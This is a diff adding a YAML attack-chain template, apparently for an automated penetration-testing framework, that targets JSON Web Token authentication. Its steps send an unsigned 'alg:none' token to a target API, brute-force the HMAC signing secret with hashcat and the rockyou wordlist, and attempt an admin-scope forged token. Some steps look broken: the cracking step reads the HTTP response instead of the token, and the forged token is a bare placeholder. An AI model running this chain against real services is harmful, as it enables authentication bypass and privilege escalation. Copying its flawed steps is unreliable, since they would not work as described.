@@ -1,0 +1,73 @@
+name: "JWT Forgery & Misconfiguration Chain"
+description: "Cutting-edge web chain: decode JWT, test for alg:none/weak secret, forge tokens, escalate access."
+category: web
+attack_vector: "JWT signature bypass → token forgery → privilege escalation"
+variables:
+  url:
+    required: true
+    description: "Target API URL"
+  token:
+    required: true
+    description: "JWT token to analyze"
+  payload:
+    required: false
+    default: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30."
+    description: "alg:none payload header (default: alg=none with empty payload)"
+cutting_edge: true
+references: ["OWASP JWT Cheat Sheet", "jwt_tool", "PortSwigger JWT"]
+
+steps:
+  - name: "decode_jwt"
+    tool: "curl_request"
+    description: "Verify the endpoint accepts the token (baseline)"
+    args:
+      url: "{{url}}"
+      method: "GET"
+      headers: "Authorization:Bearer {{token}}"
+      insecure: true
+    expected_output: null
+    timeout: 30
+    gate: false
+    retries: 1
+
+  - name: "alg_none_test"
+    tool: "curl_request"
+    description: "Test for alg:none bypass — submit unsigned token with empty signature"
+    args:
+      url: "{{url}}"
+      method: "GET"
+      headers: "Authorization:Bearer {{payload}}"
+      insecure: true
+    expected_output: "200|401|403|error"
+    timeout: 30
+    gate: false
+    retries: 1
+
+  - name: "weak_secret_test"
+    tool: "hashcat_crack"
+    description: "Brute-force weak HMAC secrets used to sign JWTs"
+    args:
+      hash_file: "output/alg_none_test.stdout.txt"
+      wordlist: "/usr/share/wordlists/rockyou.txt"
+      mode: 16500
+      attack_mode: 0
+    expected_output: null
+    timeout: 600
+    gate: false
+    retries: 1
+    extracts:
+      - var: "jwt_secret"
+        regex: "[A-Za-z0-9!@#$%^&*]{6,}"
+
+  - name: "forged_token_exploit"
+    tool: "curl_request"
+    description: "Attempt admin-scope token forgery with recovered secret"
+    args:
+      url: "{{url}}"
+      method: "GET"
+      headers: "Authorization:Bearer <FORGED>"
+      insecure: true
+    expected_output: null
+    timeout: 30
+    gate: false
+    retries: 1
